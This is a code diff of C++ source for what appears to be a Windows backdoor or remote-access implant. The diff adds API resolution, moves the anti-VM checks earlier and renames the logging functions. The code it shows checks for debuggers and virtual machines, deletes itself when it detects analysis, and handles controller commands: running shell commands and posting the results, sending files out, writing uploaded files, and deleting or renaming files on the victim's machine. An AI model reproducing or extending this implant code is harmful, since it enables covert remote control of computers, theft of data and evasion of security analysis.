@@ -31,6 +31,8 @@
 #include <shlobj_core.h>
 #include "AntiAnti.h"
 
+#include "api.h"
+
 #pragma comment(lib,"ws2_32.lib")
 
 using namespace std;
@@ -60,29 +62,34 @@ int init() {
 	int ret = 0;
 
 	//__debugbreak();
+
+	ret = getapi();
 	
 	test();
 
-	opLog("starting\r\n");
-
+	runLog("starting\r\n");
 
 	g_mutex_handle = bRunning(&ret);
 	if (ret)
 	{
-		opLog("already running\r\n");
+		runLog("already running\r\n");
 		suicide();
 	}
 
 	ret = Debug::isDebugged();
 	if (ret)
 	{
-		opLog("debuggered\r\n");
+		runLog("debuggered\r\n");
 		suicide();
 	}
 
+	VM::checkTickCount();
+
+	VM::checkVM();
+
 	Debug::attach();
 
-	ret = asmSingleTrap();
+	//ret = asmSingleTrap();
 
 	ret = exceptTest();
 
@@ -98,9 +105,7 @@ int init() {
 		}
 	}
 	
-	VM::checkVM();
 
-	VM::checkTickCount();
 
 	WSAData wsa;
 	ret = WSAStartup(0x0202, &wsa);
@@ -116,7 +121,7 @@ int init() {
 		g_interval = params->hbi*1000;
 		g_fsize_limit = params->fzLimit*1024*1024;
 
-		opLog("ip:%u,https:%u,interval:%u,filesize:%u,path:%s\r\n", g_ip, g_httpsToggle, g_interval, g_fsize_limit, params->path);
+		runLog("ip:%u,https:%u,interval:%u,filesize:%u,path:%s\r\n", g_ip, g_httpsToggle, g_interval, g_fsize_limit, params->path);
 	
 		/*
 		if ( isalpha (params->path[0]) &&params->path[1] == ':' && params->path[2] == '\\')
@@ -165,6 +170,8 @@ int init() {
 	}
 	
 	ret = getUUID();
+
+	runLog("init ok\r\n");
 
 	return ret;
 }
@@ -473,12 +480,12 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 					string filename = string(inpack->value, inpack->len);
 					packet.postFile(filename, inpack->type, (char*)hdr->hdr.hostname2, hdr->hdr.hostname2_len);
 
-					opLog("recv file operation:%s\r\n", filename.c_str());
+					runLog("recv file operation:%s\r\n", filename.c_str());
 				}
 				else if (inpack->type == MISSION_TYPE_CMD)
 				{
 					string cmd = string(inpack->value, inpack->len);
-					opLog("recv cmd:%s\r\n", cmd.c_str());
+					runLog("recv cmd:%s\r\n", cmd.c_str());
 					ret = shell(cmd.c_str());
 
 					packet.postFile(CMD_RESULT_FILENAME,0, (char*)hdr->hdr.hostname2, hdr->hdr.hostname2_len);
@@ -508,7 +515,7 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 					json.insert(KEYNAME_HEARTBEART_INTERVAL, s.c_str(), JSON_TYPE_STRING);
 					json.saveFile();
 
-					opLog("recv heartbeat:%s\r\n", s.c_str());
+					runLog("recv heartbeat:%s\r\n", s.c_str());
 				}
 				else if (inpack->type == MISSION_TYPE_UPLOAD)
 				{
@@ -517,9 +524,9 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 					int filesize = *(int*)pack2;
 					char* file = pack2 + sizeof(int);
 					
-					int ret = FileHelper::fileWriter(fn.c_str(), file, filesize, TRUE);
+					ret = FileHelper::fileWriter(fn.c_str(), file, filesize, TRUE);
 
-					opLog("recv upload file:%s\r\n", fn.c_str());
+					runLog("recv upload file:%s\r\n", fn.c_str());
 				}
 				else if (inpack->type == MISSION_TYPE_DELFILE)
 				{
@@ -536,7 +543,7 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 						ret = DeleteFileA(fn.c_str());
 					}
 
-					opLog("recv delete file:%s\r\n", fn.c_str());
+					runLog("recv delete file:%s\r\n", fn.c_str());
 				}
 				else if (inpack->type == MISSION_TYPE_RENFILE)
 				{
@@ -561,7 +568,7 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 						ret = DeleteFileA(sfn.c_str());
 					}
 
-					opLog("recv rename file from:%s to:%s\r\n", sfn.c_str(),dfn.c_str());
+					runLog("recv rename file from:%s to:%s\r\n", sfn.c_str(),dfn.c_str());
 				}
 			}
 		}
